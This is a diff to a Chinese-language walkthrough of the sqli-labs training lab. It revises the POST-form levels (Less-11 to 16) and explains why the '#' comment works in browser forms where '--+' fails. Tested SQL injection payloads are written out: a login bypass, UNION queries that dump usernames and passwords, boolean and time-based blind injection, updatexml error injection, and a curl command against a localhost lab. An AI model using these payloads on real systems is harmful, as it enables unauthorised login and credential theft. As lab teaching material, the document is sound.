@@ -40,9 +40,34 @@
 
 | 写法 | 说明 |
 |---|---|
-| `--+` | URL 里最常用。`+` 会被服务器解码成空格，等价于 `-- `（**注意 `--` 后面必须有空格**） |
-| `#` | 也能注释，但在 URL 里必须写成 `%23`，否则被浏览器当成锚点丢掉 |
-| `/* */` | 块注释，`/*` 单独用也能截断后面 |
+| `#` | **最省事，推荐**。MySQL 见到 `#` 直接注释到行尾，**不需要后面跟空格**。写在 URL 里要编码成 `%23`，填表单时浏览器会自动帮你编码 |
+| `-- ` | 注意 `--` 后面**必须跟一个空白字符**（空格 / 制表 / 换行），否则不算注释 |
+| `--+` | `-- ` 的偷懒写法。`+` 在 **URL 查询串**里等于空格，所以地址栏里 `--+` 就是 `-- `。**但在 POST 表单里会失效**，见下面的警告 |
+| `/* */` | 块注释，`/*` 单独用也能截断后面（不必配对的 `*/`） |
+
+> ⚠️ **GET 和 POST 对 `+` 的处理完全不同 —— 这是新手最容易卡住的地方**
+>
+> | 你在哪输入 | 你输入的 | 服务器实际收到 | 能否注释 |
+> |---|---|---|---|
+> | 地址栏 URL（`?id=1'--+`） | `--+` | `-- ` ← `+` 被解码成空格 | ✓ |
+> | **浏览器表单**（输入框填 `admin' --+`） | `--+` | `--+` ← **字面加号** | ✗ 语法错误 |
+>
+> 因为浏览器提交表单时，会把输入框里那个字面的 `+` 转义成 `%2B`。
+> 而 MySQL 要求 `--` 后面必须是空白字符，`--+` 不满足，于是它被当成「减号 减号 加号」三个运算符：
+>
+> ```
+> WHERE username='admin' --+ and password='x'
+> → You have an error in your SQL syntax ... near 'x' LIMIT 0,1' at line 1
+> ```
+>
+> 报错停在 `'x'`，就是因为 `and password=` 那一段被当成算式一起吸进去了。
+>
+> **所以记这一条：**
+> - **GET 关（Less-1 ~ 10，地址栏注入）** → `--+` 随便用
+> - **POST 关（Less-11 ~ 16，填表单）** → 一律用 **`#`**，或写 **`-- qwe`**
+>
+> `-- qwe` 能成的原理是：`--` 后面那个**空格**满足了 MySQL，空格之后写什么（`qwe`）都算注释内容 ——
+> 敲 `-- x`、`-- a` 也一样。加个字符只是为了防止那个空格在复制粘贴中被吃掉。
 
 ### 2. 判断列数：ORDER BY
 
@@ -604,25 +629,36 @@ $sql = "SELECT username, password FROM users WHERE username='$uname' and passwor
 
 ### 特点：从 URL 转到了表单
 
-第一关开始都是 GET，从这关开始变成 POST。用 curl 或 Burp 提交：
+前 10 关都是 GET，从这关开始变成 POST。用 curl 或 Burp 提交：
 
 ```bash
 curl -s -X POST "http://localhost/sqli-labs-master/Less-11/" \
-     --data-raw "uname=admin%27+--+&passwd=x"
+     --data-raw "uname=admin%27%23&passwd=x"
 ```
 
-> ⚠️ 两个坑：
-> 1. **不能用 `--data-urlencode`** —— 它会把 `+` 编码成 `%2B`，`--+` 就失效了。要用 `--data-raw` 自己控制编码。
-> 2. 空格要编码成 `+`，单引号写成 `%27`。上面这条 payload 解码后正好是 `admin' -- `。
+> ⚠️ **这关的注释符要用 `#`，不要用 `--+`**
 >
-> 嫌麻烦就用 **Burp Suite** 抓包改，或者浏览器 F12 → 网络 → 右键请求 → 编辑并重发。
+> 因为 payload 是填进**表单输入框**的，浏览器会把字面的 `+` 转义成 `%2B`，
+> 服务器收到的是「减号 减号 加号」而不是「减号 减号 空格」，MySQL 不认 → 语法错误。
+>
+> | 输入框里填 | 结果 |
+> |---|---|
+> | `admin'#` | ★ 成功 |
+> | `admin' -- qwe` | ★ 成功 |
+> | `admin' --+` | ✗ 报错 `near 'x' LIMIT 0,1'` |
+>
+> （原理详见第零章「1. 注释符」。如果你是用 Burp 手工构造请求体、让 `+` 当真空格，那 `--+` 也能用。）
+>
+> 另外一点：curl 别用 `--data-urlencode`（`+` 会被它编码成 `%2B`）。
+> 上面用的是 `--data-raw` 自己控制编码：`%27` = `'`，`%23` = `#`。
+> 嫌麻烦就用 **Burp Suite** 抓包改，或浏览器 F12 → 网络 → 右键请求 → 编辑并重发。
 
 ### 闭合原理
 
 ```
 原句：... WHERE username='$uname' and password='$passwd' LIMIT 0,1
-输入 uname = admin' --+
-结果：... WHERE username='admin' --+ and password='...' LIMIT 0,1
+输入 uname = admin'#
+结果：... WHERE username='admin'# and password='...' LIMIT 0,1
                                   ↑ 密码校验被注释掉了！
 ```
 
@@ -632,21 +668,21 @@ curl -s -X POST "http://localhost/sqli-labs-master/Less-11/" \
 
 **① 万能密码登录**
 ```
-uname = admin' --+
+uname = admin'#
 passwd = 随便填
 → 成功  user=admin  pass=admin
 ```
 
 **② UNION 查库名**
 ```
-uname = -1' union select 1,database()--+
+uname = -1' union select 1,database()#
 passwd = x
 → 页面显示  user=1  pass=security
 ```
 
 **③ 拖库**
 ```
-uname = -1' union select 1,group_concat(username,0x3a,password) from users--+
+uname = -1' union select 1,group_concat(username,0x3a,password) from users#
 passwd = x
 →  13 条账号密码全部显示在用户名/密码位置
 ```
@@ -669,11 +705,13 @@ $sql = "SELECT username, password FROM users WHERE username=($uname) and passwor
 
 和 Less-4 一个套路（双引号 + 括号），闭合用 **`")`**。
 
+> 💡 注释符同样用 `#`（POST 表单关，原因见 Less-11 那节的说明）。
+
 ### 通关 payload（实测）
 
 ```
-uname = admin") --+            →  成功  user=admin  pass=admin
-uname = -1") union select 1,group_concat(username,0x3a,password) from users--+
+uname = admin")#               →  成功  user=admin  pass=admin
+uname = -1") union select 1,group_concat(username,0x3a,password) from users#
 →  13 条账号密码全部拖出
 ```
 
@@ -703,7 +741,7 @@ if($row) {
 所以 UNION 也能让页面变成"成功"，但**看不到数据**：
 
 ```
-uname = admin') union select 1,2--+   →  出现 flag.jpg（但没有数据）
+uname = admin') union select 1,2#   →  出现 flag.jpg（但没有数据）
 ```
 
 要拿数据只能走**布尔盲注**。
@@ -712,13 +750,13 @@ uname = admin') union select 1,2--+   →  出现 flag.jpg（但没有数据）
 
 **闭合确认**
 ```
-uname = admin') --+   →  flag.jpg   ✓
+uname = admin')#   →  flag.jpg   ✓
 ```
 
 **布尔盲注（实测）**
 ```
-uname = admin') and length(database())=8--+   →  flag.jpg  （真）
-uname = admin') and length(database())=9--+   →  slap.jpg  （假）
+uname = admin') and length(database())=8#   →  flag.jpg  （真）
+uname = admin') and length(database())=9#   →  slap.jpg  （假）
 ```
 → 库名长度 = 8
 
@@ -743,9 +781,9 @@ $sql = "SELECT username, password FROM users WHERE username=$uname and password=
 ### 通关 payload（实测）
 
 ```
-uname = admin" --+                            →  flag.jpg
-uname = admin" and length(database())=8--+    →  flag.jpg  （真）
-uname = admin" and length(database())=9--+    →  slap.jpg  （假）
+uname = admin"#                            →  flag.jpg
+uname = admin" and length(database())=8#    →  flag.jpg  （真）
+uname = admin" and length(database())=9#    →  slap.jpg  （假）
 ```
 
 ---
@@ -768,15 +806,15 @@ else     { echo '<img src="../images/slap.jpg" />'; }
 
 **布尔盲注**
 ```
-uname = admin' --+                            →  flag.jpg
-uname = admin' and 1=2--+                     →  slap.jpg
-uname = admin' and length(database())=8--+    →  flag.jpg  （真）
-uname = admin' and length(database())=9--+    →  slap.jpg  （假）
+uname = admin'#                            →  flag.jpg
+uname = admin' and 1=2#                     →  slap.jpg
+uname = admin' and length(database())=8#    →  flag.jpg  （真）
+uname = admin' and length(database())=9#    →  slap.jpg  （假）
 ```
 
 **时间盲注**
 ```
-uname = admin' and sleep(3)--+   →  3280ms（正常 240ms）✓ 注入成功
+uname = admin' and sleep(3)#   →  3280ms（正常 240ms）✓ 注入成功
 ```
 
 ---
@@ -798,9 +836,9 @@ $sql = "SELECT username, password FROM users WHERE username=($uname) and passwor
 ### 通关 payload（实测）
 
 ```
-uname = admin") --+                          →  flag.jpg
-uname = admin") and 1=2--+                   →  slap.jpg
-uname = admin") and length(database())=8--+  →  flag.jpg  （真）
+uname = admin")#                          →  flag.jpg
+uname = admin") and 1=2#                   →  slap.jpg
+uname = admin") and length(database())=8#  →  flag.jpg  （真）
 ```
 
 ---
@@ -1135,8 +1173,9 @@ Cookie: uname=' or updatexml(1,concat(0x7e,database()),1) or '
 | updatexml 不报错、页面一片空白 | XPath 参数恰好是**合法**路径：`concat(database())` = `security` 是合法的元素名 | 加 `0x7e` 前缀，把 `~security` 变成非法 XPath |
 | updatexml 只吐一半数据 | 报错回显上限 32 字节 | 用 `substr()` 分段取 |
 | Less-13/14 的 UNION 看不到数据 | 源码里 echo 被注释掉了 | 改走布尔盲注，看 `flag.jpg` |
+| **表单里 `--+` 失灵，报错 `near 'x'`** | 浏览器把输入框里字面的 `+` 转义成 `%2B`；而 MySQL 的 `--` 注释要求后面跟空白字符，`--+` 不算注释 | **POST 关一律用 `#`**，或写 `-- qwe`（详见第零章「注释符」） |
+| curl 的 `--data-urlencode` 让 `--+` 失效 | `+` 被编码成 `%2B` | 改用 `--data-raw` 自己控制编码 |
 | 改完 Cookie 刷新又变回去了 | 点了提交按钮走了 POST 分支 | 只按 F5 刷新 |
-| curl 的 `--data-urlencode` 让 `--+` 失效 | `+` 被编码成 `%2B` | 改用 Burp 或手动构造 body |
 
 ## 附录 D：防御方案（学完攻击更要懂防御）
 
